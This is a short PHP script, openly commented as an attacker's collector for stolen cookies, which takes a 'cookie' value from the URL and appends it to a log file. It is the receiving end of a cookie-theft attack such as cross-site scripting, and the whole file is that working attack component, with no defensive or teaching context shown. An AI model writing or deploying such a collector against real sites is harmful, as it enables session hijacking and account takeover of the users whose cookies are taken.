<?php
$data = $_GET['cookie']; // Get the stolen cookie from the URL
$logFile = "log.txt"; // File to store stolen cookies

// Save the stolen cookie into a text file
file_put_contents($logFile, $data . "\n", FILE_APPEND);

exit();
?>